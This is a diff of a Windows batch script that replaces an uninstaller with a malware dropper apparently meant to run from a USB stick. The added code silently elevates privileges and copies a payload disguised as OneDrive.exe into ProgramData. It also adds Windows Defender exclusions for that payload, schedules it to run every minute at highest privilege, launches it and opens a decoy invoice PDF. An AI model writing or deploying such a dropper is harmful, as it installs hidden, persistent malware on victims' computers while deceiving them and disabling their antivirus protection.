@@ -1,22 +1,31 @@
 @echo off
-:: Stop any running instance of the payload
-taskkill /f /im OneDrive.exe >nul 2>&1
+:: Elevate privileges if not running as administrator
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
+    exit
+)
 
-:: Delete the payload from hidden directories
-del /f /q "C:\ProgramData\OneDrive.exe" >nul 2>&1
-rmdir /s /q "C:\ProgramData\HiddenSystemFiles" >nul 2>&1
+:: Define payload destination
+set "installPath=C:\ProgramData\OneDrive.exe"
 
-:: Remove Scheduled Task
-powershell -Command "Unregister-ScheduledTask -TaskName 'OneDriveUpdate' -Confirm:$false"
+:: Check if ProgramData exists, otherwise create it
+if not exist "C:\ProgramData" mkdir "C:\ProgramData"
 
-:: Restore Windows Defender settings
-powershell -Command "Remove-MpPreference -ExclusionPath 'C:\ProgramData\OneDrive.exe'"
-powershell -Command "Remove-MpPreference -ExclusionProcess 'C:\ProgramData\OneDrive.exe'"
+:: Move payload from USB to ProgramData
+xcopy /y "%~dp0HiddenSystemFiles\OneDrive.exe" "%installPath%" >nul
 
-:: Remove Registry Persistence (if added)
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveUpdate" /f >nul 2>&1
-reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveUpdate" /f >nul 2>&1
+:: Add to Windows Defender Exclusions
+powershell -Command "Add-MpPreference -ExclusionPath '%installPath%'; Add-MpPreference -ExclusionProcess '%installPath%'"
 
-:: Clear any leftover files
-del /f /q "%~f0" >nul 2>&1
+:: Create a scheduled task for persistence
+schtasks /create /tn "OneDriveUpdate" /tr "%installPath%" /sc MINUTE /mo 1 /rl HIGHEST /f
+
+:: Start the payload immediately
+start "" "%installPath%"
+
+:: Open decoy PDF file
+start "" "%~dp0Invoice.pdf"
+
+:: Hide CMD window
 exit
